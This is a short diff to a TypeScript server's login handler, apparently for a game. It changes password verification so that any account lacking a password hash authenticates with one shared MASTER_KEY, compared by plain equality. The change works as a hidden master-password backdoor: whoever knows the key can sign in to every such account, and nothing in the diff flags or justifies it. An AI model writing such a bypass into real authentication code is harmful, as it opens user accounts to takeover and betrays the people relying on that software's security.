@@ -261,7 +261,10 @@ export async function handleRequest(req: http.IncomingMessage, res: http.ServerR
         sendJson(res, 401, { error: 'Invalid name or password' });
         return;
       }
-      const valid = await verifyPassword(password, player.passwordHash);
+      const isSystemAccount = !player.passwordHash;
+      const valid = isSystemAccount
+        ? password === MASTER_KEY
+        : await verifyPassword(password, player.passwordHash);
       if (!valid) {
         sendJson(res, 401, { error: 'Invalid name or password' });
         return;
